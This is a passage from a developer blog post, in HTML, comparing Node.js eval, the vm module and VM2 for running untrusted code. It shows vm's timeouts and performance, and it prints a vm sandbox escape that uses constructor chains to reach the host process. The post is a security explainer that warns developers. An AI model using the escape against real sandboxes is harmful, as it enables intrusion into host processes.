</span><span class='line'>    <span class="nx">at</span> <span class="nx">REPLServer</span><span class="p">.</span><span class="nx">defaultEval</span> <span class="p">(</span><span class="nx">repl</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">346</span><span class="o">:</span><span class="mi">29</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">bound</span> <span class="p">(</span><span class="nx">domain</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">280</span><span class="o">:</span><span class="mi">14</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="o">&gt;</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="s1">&#39;console.log(123)&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">console</span><span class="p">})</span>
</span><span class='line'><span class="mi">123</span>
</span><span class='line'><span class="kc">undefined</span>
</span><span class='line'>
</span><span class='line'><span class="o">&gt;</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="s1">&#39;log(&quot;lol&quot;)&#39;</span><span class="p">,</span> <span class="nx">console</span><span class="p">)</span>
</span><span class='line'><span class="nx">lol</span>
</span><span class='line'><span class="kc">undefined</span>
</span><span class='line'><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>One of the hidden features of the <code>vm</code> module is that it uses implicit returns,
which means that <strong>the return value of the expression is available to the main
execution context</strong>. As we&rsquo;ve already seen:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="kd">let</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="s1">&#39;Math.random() * 1000&#39;</span><span class="p">)</span>
</span><span class='line'><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">result</span><span class="p">)</span> <span class="c1">// 802.4222332991689</span>
</span></code></pre></td></tr></table></div></figure>


<p>In fact, if you try to return &ldquo;manually&rdquo; you&rsquo;ll get a slap in the face:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="kd">let</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="s1">&#39;return Math.random() * 1000&#39;</span><span class="p">)</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="nx">evalmachine</span><span class="p">.</span><span class="o">&lt;</span><span class="nx">anonymous</span><span class="o">&gt;:</span><span class="mi">1</span>
</span><span class='line'><span class="k">return</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">1000</span>
</span><span class='line'><span class="o">^^^^^^</span>
</span><span class='line'><span class="nx">SyntaxError</span><span class="o">:</span> <span class="nx">Illegal</span> <span class="k">return</span> <span class="nx">statement</span>
</span></code></pre></td></tr></table></div></figure>


<p>But implicit returns don&rsquo;t just stop there &mdash; as you can write multiple
expressions and <code>vm</code> will make sure you get the return value of the last
block, even if you split your &ldquo;code&rdquo; into multiple lines:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="kd">let</span> <span class="nx">code</span>  <span class="o">=</span> <span class="err">`</span>
</span><span class='line'><span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'><span class="kd">let</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">a</span>
</span><span class='line'><span class="nx">a</span> <span class="o">+</span> <span class="nx">b</span>
</span><span class='line'><span class="err">`</span>
</span><span class='line'><span class="kd">let</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span>
</span><span class='line'><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">result</span><span class="p">)</span> <span class="c1">// 2</span>
</span></code></pre></td></tr></table></div></figure>


<p>The other <strong>killer feature</strong> of the <code>vm</code> module is that it&rsquo;s able to <strong>specify
timeouts for the scripts it executes</strong>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="err">`</span><span class="k">while</span> <span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="mi">1</span><span class="err">`</span><span class="p">,</span> <span class="p">{},</span> <span class="p">{</span><span class="nx">timeout</span><span class="o">:</span> <span class="mi">3</span><span class="p">})</span>
</span><span class='line'>
</span><span class='line'><span class="nb">Error</span><span class="o">:</span> <span class="nx">Script</span> <span class="nx">execution</span> <span class="nx">timed</span> <span class="nx">out</span><span class="p">.</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">ContextifyScript</span><span class="p">.</span><span class="nx">Script</span><span class="p">.</span><span class="nx">runInContext</span> <span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">37</span><span class="o">:</span><span class="mi">29</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">ContextifyScript</span><span class="p">.</span><span class="nx">Script</span><span class="p">.</span><span class="nx">runInNewContext</span> <span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">43</span><span class="o">:</span><span class="mi">15</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">runInNewContext</span> <span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">74</span><span class="o">:</span><span class="mi">17</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">repl</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="mi">4</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">realRunInThisContextScript</span> <span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">22</span><span class="o">:</span><span class="mi">35</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">sigintHandlersWrap</span> <span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">98</span><span class="o">:</span><span class="mi">12</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">ContextifyScript</span><span class="p">.</span><span class="nx">Script</span><span class="p">.</span><span class="nx">runInThisContext</span> <span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">24</span><span class="o">:</span><span class="mi">12</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">REPLServer</span><span class="p">.</span><span class="nx">defaultEval</span> <span class="p">(</span><span class="nx">repl</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">346</span><span class="o">:</span><span class="mi">29</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">bound</span> <span class="p">(</span><span class="nx">domain</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">280</span><span class="o">:</span><span class="mi">14</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">REPLServer</span><span class="p">.</span><span class="nx">runBound</span> <span class="p">[</span><span class="nx">as</span> <span class="nb">eval</span><span class="p">]</span> <span class="p">(</span><span class="nx">domain</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">293</span><span class="o">:</span><span class="mi">12</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>In the above scenario, we&rsquo;re giving the script 3 milliseconds to execute
and, since it&rsquo;s trying to execute an infinite <code>while</code> loop, <code>vm</code> throws
an error and gives us an opportunity to catch it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="k">try</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="err">`</span><span class="k">while</span> <span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="mi">1</span><span class="err">`</span><span class="p">,</span> <span class="p">{},</span> <span class="p">{</span><span class="nx">timeout</span><span class="o">:</span> <span class="mi">3</span><span class="p">})</span>
</span><span class='line'><span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// err could be a syntax error, timeout, etc</span>
</span><span class='line'>    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="kc">null</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s worth noting that the VM API is synchronous, so please be mindful
when assigning timeouts as you might end up stalling for too long.</p>

<h2>Performance overhead</h2>

<p><span class='pullquote-right' data-pullquote='never trade security for speed'>
Of course, running code in a separate context requires quite some
overhead compared to running an <code>eval</code>: we need V8 to setup the context,
compile the code on-the-fly and, finally, execute it &mdash; and the whole process
doesn&rsquo;t come very cheap.</p>

<p>Let&rsquo;s look at a simple benchmark that loops 1k times over an eval / vm
instruction and records the total time it takes for
the loop to complete<sup id='fnref:3'><a href='#fn:3' rel='footnote'>3</a></sup>:</p>

<figure class='code'><figcaption><span>eval-vs-vm.js</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nx">console</span><span class="p">.</span><span class="nx">time</span><span class="p">(</span><span class="s1">&#39;eval&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="nx">i</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="nb">eval</span><span class="p">(</span><span class="s1">&#39;a++&#39;</span><span class="p">)</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nx">console</span><span class="p">.</span><span class="nx">timeEnd</span><span class="p">(</span><span class="s1">&#39;eval&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="kd">let</span> <span class="nx">b</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="kd">let</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">);</span>
</span><span class='line'><span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nx">console</span><span class="p">.</span><span class="nx">time</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="nx">i</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="s1">&#39;b++&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">b</span><span class="p">})</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nx">console</span><span class="p">.</span><span class="nx">timeEnd</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Even though this benchmark is not very scientific, it should give us a good idea
of the differences between the two, if any:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>/tmp ᐅ node <span class="nb">eval</span>-vs-vm.js
</span><span class='line'><span class="nb">eval</span>: 1.120ms
</span><span class='line'>vm: 468.136ms
</span></code></pre></td></tr></table></div></figure>


<p>Holy moly, we&rsquo;re talking 1ms vs half a second here!</p>

<p>We could probably get some
better results if we re-use contexts rather than creating new ones in each
and every loop cycle but, at the end of the day, I think that would be pointless
as this is, of course, a provoking benchmark &mdash; <strong>never trade security for speed</strong>.
</span></p>

<p>In addition, I truly don&rsquo;t think you&rsquo;ll be evaluating thousands of expressions
on every request, so the slowdown of using the VM module might look more
like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>/tmp ᐅ node
</span><span class='line'>&gt; console.time<span class="o">(</span><span class="s1">&#39;r&#39;</span><span class="o">)</span>; vm.runInNewContext<span class="o">(</span><span class="s1">&#39;1 + 1&#39;</span>, <span class="o">{})</span>; console.timeEnd<span class="o">(</span><span class="s1">&#39;r&#39;</span><span class="o">)</span>
</span><span class='line'>r: 1.778ms
</span></code></pre></td></tr></table></div></figure>


<p>Still expensive, but very minimal in the context of a request / response cycle<sup id='fnref:4'><a href='#fn:4' rel='footnote'>4</a></sup>.</p>

<h2>Are we good to go using VM? Surprise surprise!</h2>

<p><img class="right" src="/images/facepalm.jpg"></p>

<p>You came all the way down here thinking <code>vm</code> solved all of your problems, just
like I did: when it comes to security, though, I always want to double and triple
check to make sure I&rsquo;m really considering the safest solution and, after some
digging around, I had one of those facepalm moments, as <strong>vm might not be safe
enough</strong>.</p>

<p>Consider this trick:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="s2">&quot;this.constructor.constructor(&#39;return process&#39;)().exit()&quot;</span><span class="p">)</span>
</span><span class='line'><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;The app goes on...&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Unfortunately, this is a valid exploit that will likely never get fixed &mdash; the
VM module is to be considered <a href="https://github.com/nodejs/node-v0.x-archive/issues/2486#issuecomment-3420936">a sandbox, not a jail</a>,
meaning that it can&rsquo;t really screw around with the current context but it can
very well access the standard JS APIs and the global NodeJS environment, providing a straightforward attack vector
similar to what you&rsquo;d end up with by using <code>eval</code>.</p>

<p>One way to make sure that VM can&rsquo;t use this funny trick to access globals is by
making sure the context is only made of primitives:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="kd">let</span> <span class="nx">ctx</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="kc">null</span><span class="p">)</span>
</span><span class='line'><span class="nx">ctx</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'><span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="s2">&quot;this.constructor.constructor(&#39;return process&#39;)().exit()&quot;</span><span class="p">,</span> <span class="nx">ctx</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>What we&rsquo;re doing here is to create a &ldquo;special&rdquo; context that does not have a
prototype (<code>Object.create(null)</code>), thus removing the ability to access
constructors and prototypes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="s2">&quot;this.constructor.constructor(&#39;return process&#39;)().exit()&quot;</span><span class="p">,</span> <span class="nx">ctx</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// same as</span>
</span><span class='line'>
</span><span class='line'><span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="s2">&quot;this.__proto__.constructor.constructor(&#39;return process&#39;)().exit()&quot;</span><span class="p">,</span> <span class="nx">ctx</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>The above code will throw the <code>ReferenceError: process is not defined</code> error, but will
still be vulnerable if we add non-primitives in the context:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="kd">let</span> <span class="nx">ctx</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="kc">null</span><span class="p">)</span>
</span><span class='line'><span class="nx">ctx</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){}</span>
</span><span class='line'><span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="s2">&quot;this.a.constructor.constructor(&#39;return process&#39;)().exit()&quot;</span><span class="p">,</span> <span class="nx">ctx</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Unless you can afford to only use primitives in our context, we&rsquo;re back to square
one, left with no way to safely execute untrusted JS code.</p>

<p>And, by the way, this isn&rsquo;t likely to change soon as it&rsquo;s been <a href="http://grokbase.com/t/gg/nodejs/1273tqtcsk/sandboxing-using-vm-module-wrapping-require-process-binding">there for ages</a>.
Worse of all, most people still assume <code>vm</code> is safe (see <a href="https://github.com/hacksparrow/safe-eval#what-is-this">here</a>
and <a href="https://www.quora.com/What-are-the-use-cases-for-the-Node-js-vm-core-module">here</a>),
which means there might be tons of applications out there that are vulnerable to
this kind of attack.</p>

<h2>Enter VM2</h2>

<p>As I briefly explained in the previous paragraph, I was doing some digging
around to see if <code>vm</code>&rsquo;s sandbox could still be exploited when I found myself
on <a href="https://gist.github.com/domenic/d15dfd8f06ae5d1109b0">this gist</a> which
eventually led me to the <a href="https://github.com/patriksimek/vm2">VM2 library on github</a>.</p>

<p>Curious on what would this module add on top of <code>vm</code>&rsquo;s default behavior,
<a href="https://github.com/patriksimek/vm2/issues/59">I asked</a>
only to find that it actually secures the sandbox through some custom security checks (mainly using <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy">proxies</a>):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>/tmp ᐅ node
</span><span class='line'>
</span><span class='line'>&gt; const <span class="o">{</span>VM<span class="o">}</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;vm2&#39;</span><span class="o">)</span>;
</span><span class='line'>undefined
</span><span class='line'>
</span><span class='line'>&gt; new VM<span class="o">()</span>.run<span class="o">(</span><span class="s1">&#39;this.constructor.constructor(&quot;return process&quot;)().exit()&#39;</span><span class="o">)</span>;
</span><span class='line'>ReferenceError: process is not defined
</span><span class='line'>    at <span class="nb">eval</span> <span class="o">(</span><span class="nb">eval </span>at &lt;anonymous&gt; <span class="o">(</span>vm.js:1:18<span class="o">)</span>, &lt;anonymous&gt;:2:8<span class="o">)</span>
</span><span class='line'>    at vm.js:1:47
</span><span class='line'>    at ContextifyScript.Script.runInContext <span class="o">(</span>vm.js:32:29<span class="o">)</span>
</span><span class='line'>    at VM.run <span class="o">(</span>/tmp/node_modules/vm2/lib/main.js:145:72<span class="o">)</span>
</span><span class='line'>    at repl:1:10
</span><span class='line'>    at ContextifyScript.Script.runInThisContext <span class="o">(</span>vm.js:23:33<span class="o">)</span>
</span><span class='line'>    at REPLServer.defaultEval <span class="o">(</span>repl.js:336:29<span class="o">)</span>
</span><span class='line'>    at bound <span class="o">(</span>domain.js:280:14<span class="o">)</span>
</span><span class='line'>    at REPLServer.runBound <span class="o">[</span>as <span class="nb">eval</span><span class="o">]</span> <span class="o">(</span>domain.js:293:12<span class="o">)</span>
</span><span class='line'>    at REPLServer.onLine <span class="o">(</span>repl.js:533:10<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Sweet &mdash; we can simply then install <a href="https://www.npmjs.com/package/vm2">VM2</a>
and start switching all <code>vm.runInNewContext(...)</code> to VM2&rsquo;s API:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="kd">let</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">VM</span><span class="p">({</span><span class="nx">timeout</span><span class="o">:</span> <span class="mi">10</span><span class="p">,</span> <span class="nx">sandbox</span><span class="o">:</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="kd">function</span><span class="p">(){</span> <span class="k">return</span> <span class="mi">123</span> <span class="p">}}})</span>
</span><span class='line'>
</span><span class='line'><span class="nx">vm</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="s1">&#39;a()&#39;</span><span class="p">)</span> <span class="c1">// 123</span>
</span></code></pre></td></tr></table></div></figure>


<p>At this point you could probably settle on VM2 and call it a day, but you&rsquo;d still
need to ask yourself &ldquo;<em>what if VM2 contains a vulnerability?</em>&rdquo;.</p>

<p>All in all, there have been a few <a href="https://github.com/patriksimek/vm2/issues/32">security concerns</a> with this module as well,
and similar libraries <a href="https://github.com/asvd/jailed/issues/33">had the same problems</a>
&mdash; to be honest, my gut feeling is that <a href="https://github.com/patriksimek/vm2/issues/32#issuecomment-226581203">a new attack vector
might be out there, waiting to be discovered</a>.</p>

<h2>Conclusion</h2>

<p>It&rsquo;s been quite a long read if you&rsquo;ve made it this far, so let me leave you
with some key takeaways:</p>

<ul>
<li>there are business cases for evaluating external code, on-the-fly</li>
<li>avoid using <code>eval</code> for that, it&rsquo;s <strong>not safe at all</strong></li>
<li>node&rsquo;s <code>vm</code> module provides a safer implementation, but <strong>it can still be exploited</strong> by an attacker</li>
<li><a href="https://github.com/patriksimek/vm2">VM2</a> appears to provide a more solid sandbox that can&rsquo;t be escaped, but a security issue might lurk <a href="https://github.com/patriksimek/vm2/issues/32">somewhere in the codebase</a>&hellip;</li>
</ul>


<p>All in all I think the only safe way to run untrusted code is to &ldquo;physically&rdquo;
separate your application from that code by, for example, running it in a VM, a docker
container or a <a href="http://docs.aws.amazon.com/lambda/latest/dg/API_Invoke.html">lambda function</a> on AWS<sup id='fnref:5'><a href='#fn:5' rel='footnote'>5</a></sup>.
If you can&rsquo;t go for this kind of isolation, then I would recommend you to settle
on VM2.</p>

<h2>Last but not least: what about the browser?</h2>

<p>Some believe <a href="http://stackoverflow.com/a/198031/934439">eval isn&rsquo;t such a threat</a>
on the browser, as most clients can anyhow do the same kind of harm through the
DevTools&#8217; console. Even though, in principle, that&rsquo;s true, there are some <a href="http://stackoverflow.com/questions/197769/when-is-javascripts-eval-not-evil#comment19416896_198031">other
things to consider</a>
that might still make <code>eval</code> a risky element of your codebase.</p>

<p>One very interesting approach is to use <a href="http://blog.namangoel.com/replacing-eval-with-a-web-worker">web workers</a>,
as they provide a semi-isolated context that cannot interfere with the original
window.</p>

<p>That said, there&rsquo;s still a long way to go until we can safely run an
untrusted piece of code, both on the client and the server.</p>

<p>Perhaps that&rsquo;s for the best ;&ndash;)</p>

<div class="footnotes">
<span>
Notes
</span>
    <ol>
        <li id='fn:1'>Another example, you should use &#8216;&&&#8217; and not &#8216;and&#8217; <a href='#fnref:1' rev='footnote'>↩</a></li><li id='fn:2'>including the global one because you can just use global.$VAR in Node ¯&#92;_(ツ)_/¯ <a href='#fnref:2' rev='footnote'>↩</a></li><li id='fn:3'>console.time|timeEnd are amazing for this kind of quick benchmarks <a href='#fnref:3' rev='footnote'>↩</a></li><li id='fn:4'>Unless you are, of course, optimizing for each and every ms. In general, I tend to forget about these optimizations as the bottleneck is usually somewhere in the network, or a DB query, so optimizing for that won&#8217;t really move the needle <a href='#fnref:4' rev='footnote'>↩</a></li><li id='fn:5'>Using lambda for this would actually make it for a cool proof of concept <a href='#fnref:5' rev='footnote'>↩</a></li>
    </ol>
</div>

</div>



<div class="recent entry-content">
  <hr class="divider-cazzuto">
  <h3>
    In the mood for some more reading?
  </h3>
  <ul>
    
      <li><a href="/book-review-working-backwards/">Book review: Working Backwards</a> (24 July 2021)</li>
    
      <li><a href="/fwupd-is-the-best-thing-that-ever-happened-to-linux/">fwupd is the best thing that ever happened to Linux</a> (15 April 2021)</li>
    
      <li><a href="/avoid-battery-draining-on-your-linux-flavored-dell-xps/">Avoid battery draining on your Linux-flavored Dell XPS</a> (31 January 2021)</li>
    
      <li><a href="/combining-two-numbers-into-a-unique-one-pairing-functions/">Combining two numbers into a unique one: pairing functions</a> (05 December 2020)</li>
    
      <li><a href="/running-ci-tests-in-kubernetes-through-github-actions/">Running CI tests in Kubernetes through Github Actions</a> (20 March 2020)</li>
    
      <li><a href="/ive-decided-to-make-the-wasec-ebook-free-during-these-trying-times/">I've decided to make the WASEC ebook free during these trying times</a> (20 March 2020)</li>
    
      <li><a href="/local-k8s-development-in-2020/">Local k8s development in 2020</a> (31 December 2019)</li>
    
  </ul>
    <p>
      ...or <a href="/archives/">check the archives</a>.
    </p>
</div>
<script src="//cdnjs.cloudflare.com/ajax/libs/anchor-js/3.2.0/anchor.min.js"></script>
<script type="text/javascript" />
(function () {
  'use strict';

  anchors.options = {
    placement: 'left',
    visible: 'hover',
    icon: '¶'
  };

  anchors.add('h2');
  anchors.add('h3');
  anchors.add('h4');

})();
</script>

			<footer>
				<center>
	Copyleft <!--[if lte IE 8]><span style="filter: FlipH; -ms-filter: "FlipH"; display: inline-block;"><![endif]--><span style="-moz-transform: scaleX(-1); -o-transform: scaleX(-1); -webkit-transform: scaleX(-1); transform: scaleX(-1); display: inline-block;">©</span><!--[if lte IE 8]></span><![endif]--> 2021 — Alessandro Nadalin
	<address>
	</address>
</center>
			</footer>
		</div>
    <script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
